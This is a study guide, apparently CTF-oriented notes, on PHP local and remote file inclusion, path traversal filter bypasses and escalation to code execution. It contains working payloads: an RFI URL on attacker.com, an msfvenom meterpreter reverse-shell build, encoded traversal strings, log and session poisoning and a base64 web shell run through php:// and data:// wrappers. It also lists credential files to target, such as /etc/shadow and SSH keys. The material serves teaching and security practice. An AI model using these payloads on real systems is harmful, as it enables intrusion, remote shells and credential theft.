# File Inclusion, Path Traversal

## 1. File Inclusion Types

* Most commonly seen in **PHP based web applications**.
* The attacker’s capabilities are **restricted by the privileges of the web server user** (for example `www-data` on Linux).

A **traversal string** like `../` is used in path traversal attacks to move through the filesystem hierarchy. Each `../` moves **one directory up** from the current directory. Attackers use this to access files **outside the intended application directory**.

Example idea:

```txt
../../../../etc/passwd
```

Each `../` climbs upward until the attacker reaches a sensitive location in the filesystem.

**Relative pathing** means locating files **relative to the current script location**.

Example:

```txt
include('./folder/file.php')
```

This tells PHP to include `file.php` from a directory named `folder` located **in the same directory as the executing script**.

**Absolute pathing** specifies the **full filesystem path starting from root**.

Example:

```txt
/var/www/html/folder/file.php
```

Absolute paths ignore the current directory and directly reference the file's location in the system.

### 1.1 Local File Inclusion

**Local File Inclusion (LFI)** occurs when an attacker can manipulate an input parameter that is used to load a file on the server.

The vulnerability usually appears when applications **directly pass user input into file include functions** without proper validation.

Example:

```txt
include.php?page=../../../../etc/passwd
```

Here the attacker uses traversal sequences to reach sensitive files.

Typical impact of LFI:

* Reading sensitive system files
* Accessing configuration files
* Viewing source code
* Discovering credentials or API keys

Even though LFI initially allows **file reading**, it can escalate to **Remote Code Execution (RCE)** if the attacker manages to get executable code included by the application.

Common escalation techniques include:

* **Log poisoning** – injecting PHP code into log files and then including them
* **Session poisoning** – injecting PHP into session files
* **Uploading malicious files** that later get included

### 1.2 **Remote File Inclusion**

**Remote File Inclusion (RFI)** allows an attacker to load a **remote script from an external server**.

This leads directly to **remote code execution**, because the application executes attacker-controlled code.

Example vulnerable parameter:

```txt
include.php?page=http://attacker.com/exploit.php
```

If the application includes this file, the attacker’s script executes on the server.

Typical attack flow:

1. Attacker hosts a malicious PHP file.
2. The vulnerable application includes it through a parameter.
3. The script executes on the target server.
4. The attacker gains a shell.

Important constraints:

* The **server-side language must match the payload**.
  Example: a PHP payload will not execute on an ASP server.
* The server-side language must support dynamic inclusion (e.g., PHP)
* PHP must allow remote file inclusion through configuration.

Relevant settings in `php.ini`:

```txt
allow_url_fopen = On
allow_url_include = On
```

In modern, properly configured environments, these features are usually **disabled by default**, making direct RFI-based code execution unlikely.

### Identifying required remote file names

Sometimes the server expects a **specific file name**. A quick way to discover this is to run a **Netcat listener** and observe the request the server makes.

Example scenario:

Target request:

```txt
/filter.php?url=http://192.168.1.228:4444
```

Listener output:

```bash
root@machine:~$ nc -lvnp 4444

listening on [any] 4444...
connect to [192.168.1.228] from (unknown) [192.168.1.177] 56875
GET /wp-load.php HTTP/1.0
Host:192.168.1.228:4444
```

This reveals the server is requesting **`wp-load.php`**.

So the payload file should be named accordingly.

Example payload generation:

```bash
root@machine:~$ msfvenom -p php/meterpreter_reverse_tcp LHOST=[] LPORT=[] -f raw > wp-load.php
```

Then:

1. Start a **Metasploit handler** `exploit/multi/handler`
2. Trigger the vulnerable request.
3. The server downloads and executes the payload, establishing the reverse shell.

---

## 2. PHP Wrappers

**PHP wrappers** are built-in mechanisms that allow PHP to access different **data streams and resources using special protocols**. These protocols can read files, transform data, or even execute code depending on how they are used.

In the context of **LFI exploitation**, wrappers become extremely powerful because they allow attackers to:

* read restricted files
* transform file content
* inject or execute code
* bypass filtering mechanisms

If a vulnerable application includes files based on user input, wrappers can sometimes **turn a simple file read into deeper information disclosure or even code execution**.

### 2.1 PHP Filter

One of the most useful wrappers during exploitation is: `php://filter`

This wrapper allows **data transformations before the file is read**.

A common use during LFI exploitation is **base64 encoding a file**, which helps when the application cannot display raw file content properly.

Example target file: `/etc/passwd`

Payload:

```id="w41s1a"
php://filter/convert.base64-encode/resource=/etc/passwd
```

Explanation of the payload:

* `php://filter` → activates the wrapper
* `convert.base64-encode` → encodes the file content
* `resource=` → specifies the file being accessed

When the server processes this payload, it **returns the encoded content instead of raw data**.

![img](/img/FileInclusionAndPT/1.png)

The server response contains **base64 encoded data**.

![img](/img/FileInclusionAndPT/2.png)

The attacker then **decodes the output locally** to retrieve the original file contents.

![img](/img/FileInclusionAndPT/3.png)

This technique is extremely useful when:

* the application breaks when rendering raw files
* special characters cause output issues
* the application tries to sanitize the response

### Types of PHP Filters

PHP supports many filters that modify data streams. Some categories include:

**String Filters:**

```txt
string.rot13
string.toupper
string.tolower
string.strip_tags
```

**Conversion Filters:**

```txt
convert.base64-encode
convert.base64-decode
convert.quoted-printable-encode
convert.quoted-printable-decode
```

**Compression Filters:**

```txt
zlib.deflate
zlib.inflate
```

**Encryption Filters** (deprecated)

```txt
mcrypt
mdecrypt
```

Example behavior when applying filters to `.htaccess`:

| Payload                                               | Output                                       |
| ----------------------------------------------------- | -------------------------------------------- |
| php://filter/convert.base64-encode/resource=.htaccess | UmV3cml0ZUVuZ2luZSBvbgpPcHRpb25zIC1JbmRleGVz |
| php://filter/string.rot13/resource=.htaccess          | ErjevgrRatvar ba Bcgvbaf -Vaqrkrf            |
| php://filter/string.toupper/resource=.htaccess        | REWRITEENGINE ON OPTIONS -INDEXES            |
| php://filter/string.tolower/resource=.htaccess        | rewriteengine on options -indexes            |
| php://filter/string.strip_tags/resource=.htaccess     | RewriteEngine on Options -Indexes            |
| No filter applied                                     | RewriteEngine on Options -Indexes            |

This shows how filters **transform file content before it is returned**.

### 2.2 Data Wrapper

The `data://` wrapper allows **embedding data directly inside a URL**. If the application includes this data as a file, it may lead to **code execution**.

Example payload:

```id="6c1aqk"
data:text/plain,<?php%20phpinfo();%20?>
```

Breakdown:

* `data:` → wrapper protocol
* `text/plain` → MIME type
* embedded PHP code → `<?php phpinfo(); ?>`

If the vulnerable application includes this payload, PHP **interprets the embedded code and executes it**.

Example result:

![img](/img/FileInclusionAndPT/4.png)

In this case the payload triggers `phpinfo()` and the server returns **PHP configuration details**, confirming **code execution through the wrapper**.

---

## 3. Base Directory Breakout

Many web applications attempt to defend against **path traversal** by forcing user input to stay inside a specific directory (a *base directory*). Developers often implement simple string checks to prevent traversal sequences like `../`.

However, these defenses frequently rely on **naive filtering**, which can often be bypassed.

Example defensive code:

```php
function containsStr($str, $subStr){
    return strpos($str, $subStr) !== false;
}

if(isset($_GET['page'])){
    if(!containsStr($_GET['page'], '../..') && containsStr($_GET['page'], '/var/www/html')){
        include $_GET['page'];
    }else{ 
        echo 'You are not allowed to go outside /var/www/html/ directory!';
    }
}
```

What this code attempts to enforce:

1. The requested path **must contain `/var/www/html`**
2. The input **must not contain `../..`**

If both conditions pass, the file is included.

At first glance this seems reasonable, but the protection is fragile because it relies on **exact string matching**.

### 3.1 Bypassing the Filter

A bypass can be achieved by using **slightly modified traversal sequences** that still resolve correctly in the filesystem.

Example payload:

```txt
/var/www/html/..//..//..//etc/passwd
```

Why this works:

* The filter only blocks the **exact pattern `../..`**
* The payload uses **`..//..//` instead**

To the filesystem `..//..//` is same as `../../`

Multiple slashes (`//`) are treated the same as a single slash (`/`) by most operating systems.

So even though the filter blocks `../../` It **does not detect** `..//..//`

This allows traversal **outside the base directory** while still passing the filter conditions.

Example result:

![img](/img/FileInclusionAndPT/5.png)

### 3.2 Obfuscation

Real-world filters frequently try to block obvious traversal patterns like: `../`

Attackers respond with **obfuscation techniques** to disguise traversal sequences while preserving their functionality.

A common method is **encoding**.

Encoding converts characters into another representation that the server later decodes.

**URL Encoding:**

Traversal characters encoded using percent-encoding:

`../` -> `%2e%2e%2f`

Payload example:

```txt
?file=%2e%2e%2fconfig.php
```

If the application decodes input before processing, this becomes:

```txt
../config.php
```

Which bypasses simple filters.

**Double Encoding:**

Sometimes applications **decode input more than once**.

In that case attackers use **double encoding**.

`../` -> `%252e%252e%252f`

```bash
# First decode:
%252e → %2e
%252f → %2f

# Second decode:
%2e → .
%2f → /

# Final result: 
../
```

Payload example:

```txt
?file=%252e%252e%252fconfig.php
```

**Traversal Obfuscation:**

Another technique is **masking traversal patterns** with extra characters.

Example:

`....//` If the application removes `../`, this string may transform into `../`

Which still produces a valid traversal.

Example vulnerable code:

```php
$file = $_GET['file'];
$file = str_replace('../', '', $file);

include('files/' . $file);
```

Possible bypasses:

```bash
#URL Encoded Traversal:
?file=%2e%2e%2fconfig.php

# Double Encoded Traversal
?file=%252e%252e%252fconfig.php

# Traversal Obfuscation
?file=....//config.php
```

### 3.3 Common Files to Target

**Linux:**

```txt
/etc/passwd
/etc/issue
/etc/group
/etc/shadow (root only)
```

**Windows:**

```txt
WINDOWS\System32\drivers\etc\hosts
C:\Users\[Username]\Desktop\desktop.ini
WINDOWS\System32\win.ini
```

These files are useful for:

* identifying users
* understanding system configuration
* gathering pivoting information

### 3.4 LFI — Now What? (CTF Mindset)

Once you confirm LFI, the next step is **information leverage**.

Typical progression during CTFs:

* **Enumerate system users**

  Linux systems often start normal users at UID **1000**.

* **Search readable files:**
  * application configs
  * backup files
  * credential files
  * logs

* **Check SSH artifacts**

```text
~/.ssh/id_rsa
~/.ssh/authorized_keys
```

* **Look for service pivots**

  Examples:
  * SSH
  * database credentials
  * cron jobs
  * writable logs

---

## 4. Local File Inclusion to Remote Code Execution

LFI initially gives **file read access**, but the real goal is usually **code execution**. This happens when an attacker can inject executable code into a file that the application later includes.

Common escalation techniques:

* PHP session poisoning
* Log poisoning
* PHP wrapper exploitation

### 4.1 PHP Session Files

PHP applications commonly store **session data in files on the server**. These files typically reside in directories such as:

```id="u9b4ak"
/var/lib/php/sessions/
```

If user-controlled data gets written into a session file and that file is later included through an LFI vulnerability, **PHP code inside the session file will execute**.

Example vulnerable application:

```php id="2ra35r"
if(isset($_GET['page'])){
    $_SESSION['page'] = $_GET['page'];
    echo "You're currently in" . $_GET["page"];
    include($_GET['page']);
}
```

The attacker injects PHP code through the parameter:

```id="ztmpo0"
?page=<?php echo phpinfo(); ?>
```

![img](/img/FileInclusionAndPT/6.png)

The injected payload gets **stored inside the user's session file** on the server.

To execute it, the attacker needs the **session file path**, which includes the **session ID**.

Session IDs can be found in the browser cookies:

![img](/img/FileInclusionAndPT/7.png)

The session file typically follows this pattern:

```id="a2e9cm"
/var/lib/php/sessions/sess_[sessionID]
```

Example LFI payload:

```id="y8ok0d"
sessions.php?page=/var/lib/php/sessions/sess_[sessionID]
```

Replace `[sessionID]` with the value from the `PHPSESSID` cookie.

When the application includes this file, **the injected PHP code executes**.

![img](/img/FileInclusionAndPT/8.png)

### 4.2 Log Poisoning

**Log poisoning** works by injecting PHP code into server log files and then including those logs using LFI.

Web servers store request information in logs such as:

```id="g2v5ew"
/var/log/apache2/access.log
/var/log/apache2/error.log
```

If the attacker manages to place PHP code inside these logs, the file can later be executed when included.

One simple method is sending a crafted request containing PHP code.

Example using Netcat:

```bash
$ nc MACHINE_IP 80      
<?php echo phpinfo(); ?>
HTTP/1.1 400 Bad Request
Date: Thu, 23 Nov 2023 05:39:55 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 335
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at MACHINE_IP.eu-west-1.compute.internal Port 80</address>
</body></html>
```

Even though the request fails, **the payload is still logged**.

The injected code ends up inside the access log:

Then the attacker triggers LFI:

```id="jhy6vu"
?page=/var/log/apache2/access.log
```

![img](/img/FileInclusionAndPT/9.png)

When the application includes the log file, **the injected PHP code executes**, giving code execution.

### 4.3 PHP Wrappers for Code Execution

PHP wrappers are not limited to reading files. They can also be used to **execute attacker-controlled payloads**.

One method combines:

* `php://filter`
* `data://`

Goal: execute **base64 encoded PHP code**.

Example payload code:

```id="h71g9k"
<?php system($_GET['cmd']); echo 'Shell done!'; ?>
```

Base64 encoded version:

```id="o4c3av"
PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+
```

Full exploit payload:

```id="b54u5b"
php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+
```

Breakdown of the payload structure:

| Position | Field            | Value                                                                |
| -------- | ---------------- | -------------------------------------------------------------------- |
| 1        | Protocol Wrapper | php://filter                                                         |
| 2        | Filter           | convert.base64-decode                                                |
| 3        | Resource Type    | resource=                                                            |
| 4        | Data Type        | data://plain/text,                                                   |
| 5        | Encoded Payload  | PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+ |

Execution flow:

1. `data://` embeds the base64 payload
2. `php://filter` decodes it
3. The decoded PHP code executes on the server

Once executed, the attacker can run commands through the GET parameter:

```id="k3l3ml"
&cmd=whoami
```

Example result:

![img](/img/FileInclusionAndPT/10.png)

**Important:**
Do **not** place `&cmd=whoami` inside the input field used to inject the payload. If it gets encoded together with the payload, the backend treats it as part of the base64 data, which results in an **invalid byte sequence error**.

Instead, append it **after the payload is already accepted by the application**.

---
